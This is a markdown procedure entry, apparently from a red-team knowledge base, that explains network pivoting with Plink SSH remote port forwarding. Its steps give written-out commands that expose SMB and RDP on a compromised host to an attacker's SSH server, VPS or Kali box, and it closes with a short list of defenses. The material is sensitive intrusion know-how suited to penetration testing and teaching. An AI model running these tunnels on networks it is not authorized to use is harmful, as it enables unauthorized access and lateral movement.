---
id: a0f7c7fa-bd2b-4df5-84e9-e7c47f6e0255
name: Network-Pivoting-with-Plink-Port-Forwarding
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.009128+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - >-
    [[sub-techniques/Remote Desktop Protocol|T1021.001 - Remote Desktop
    Protocol]]
  - >-
    [[sub-techniques/SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin
    Shares]]
tags:
  - '[[tags/Network Pivoting Techniques]]'
  - '[[tags/plink]]'
  - ssh-tunneling
  - lateral-movement
commands:
  - '[[commands/plink-expose-smb-port-on-ssh-server]]'
  - '[[commands/plink-expose-rdp-port-on-ssh-server]]'
  - '[[commands/plink-forward-port-to-vps]]'
  - '[[commands/plink-redirect-windows-port-to-kali]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Plink]]'
validated: true
---

# Network-Pivoting-with-Plink-Port-Forwarding

## Summary

This procedure demonstrates how to use Plink, a command-line SSH client, to establish port forwarding tunnels for network pivoting. By forwarding traffic through a compromised host with SSH access, attackers can bypass network restrictions and access internal services like SMB or RDP that are not directly reachable from the attacker's machine.

## Description

Network pivoting involves routing traffic through an already compromised host to reach other systems in a restricted network. Plink facilitates this by creating SSH tunnels for remote or local port forwarding. For example, you can expose internal services (e.g., SMB on port 445 or RDP on 3389) on the SSH server's ports, allowing external access. This is useful in scenarios where the attacker has SSH credentials on a foothold host but needs to interact with internal Windows services. The technique relies on the -R (remote forwarding) and -L (local forwarding) options to map ports between the local machine, the pivot host, and the target. Prerequisites include SSH access to the pivot host and Plink installed on the attacker's Windows machine. Success enables lateral movement without direct network exposure.

## Requirements

1. SSH credentials (username and password or key) for a compromised pivot host.
2. Plink tool installed on the attacker's Windows machine.
3. Network access to the SSH server (typically port 22).
4. Knowledge of target internal service ports (e.g., 445 for SMB, 3389 for RDP).
5. Listener or client tools on the attacker side to connect to forwarded ports.

## Defense

- Monitor SSH logs for unusual port forwarding attempts (e.g., via /var/log/auth.log on Linux pivots).
- Implement network segmentation to isolate compromised hosts from internal services.
- Use SSH key-based authentication with restrictions on allowed ports and commands.
- Deploy intrusion detection systems (IDS) to flag anomalous traffic patterns, such as external connections to internal service ports.
- Regularly audit open ports and disable unnecessary services like RDP or SMB on internal hosts.

## Objectives

1. Establish SSH tunnels to pivot traffic through a compromised host.
2. Expose internal services (e.g., SMB, RDP) for external access.
3. Enable lateral movement to reach restricted network segments.
4. Verify tunnel functionality by connecting to forwarded ports.

## Instructions

### Step 1: Expose SMB Port on SSH Server

**Context**: Forward the pivot host's local SMB port (445) to a specific port on the SSH server, allowing the attacker to access internal SMB shares remotely via the SSH server's IP.

**Command** ([[commands/plink-expose-smb-port-on-ssh-server]]):
```bash
plink -l root -pw toor -R 445:127.0.0.1:445 ssh-server-ip
```

> This command creates a remote forward (-R) mapping the pivot's localhost:445 to the SSH server's port 445. Replace 'ssh-server-ip' with the actual IP. The tunnel persists until interrupted. Expected: Plink connects and shows a prompt or background mode if no interactive shell is needed.

### Step 2: Expose RDP Port on SSH Server

**Context**: Similar to SMB, forward the RDP port (3389) to a non-standard port (e.g., 3390) on the SSH server to avoid conflicts and enable remote desktop access to internal Windows hosts.

**Command** ([[commands/plink-expose-rdp-port-on-ssh-server]]):
```bash
plink -l root -pw toor -R 3390:127.0.0.1:3389 ssh-server-ip
```

> Use -R to bind the pivot's RDP port to the SSH server's 3390. Connect to the SSH server's IP on port 3390 using an RDP client to reach the internal target. Expected: Successful SSH connection with no errors; test by attempting RDP connection.

### Step 3: Forward Port to VPS

**Context**: In scenarios with a VPS as an intermediary, forward a port from the local machine to the VPS, which can then pivot further. This is useful for chaining pivots or evading direct exposure.

**Command** ([[commands/plink-forward-port-to-vps]]):
```bash
plink -R $_REMOTE_PORT:localhost:$_LOCAL_PORT $_VPS_IP
```

> Customize $_REMOTE_PORT (e.g., 445 on VPS), $_LOCAL_PORT (e.g., 445 on local), and $_VPS_IP. This sets up remote forwarding. Expected: Tunnel established; verify by accessing the forwarded service via the VPS IP.

### Step 4: Redirect Windows Port to Kali

**Context**: Redirect an internal Windows SMB port through a Kali Linux pivot host (on port 22) to the attacker's machine, enabling access to Windows admin shares from an external position.

**Command** ([[commands/plink-redirect-windows-port-to-kali]]):
```bash
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
```

> Here, -P 22 specifies the SSH port, -C enables compression, and -R forwards the Windows target's 445 to the Kali pivot. Replace IP and credentials. Expected: Plink output indicates connection; test SMB access using the pivot's IP on port 445.

### Step 5: Verify and Maintain Tunnels

**Context**: After establishing tunnels, verify connectivity and handle interruptions.

Use tools like telnet or nmap to test forwarded ports (e.g., `telnet ssh-server-ip 445`). Monitor Plink output for errors. To run in background, add `-N -T` flags to avoid shell allocation. If using keys instead of passwords, replace -pw with -i keyfile.
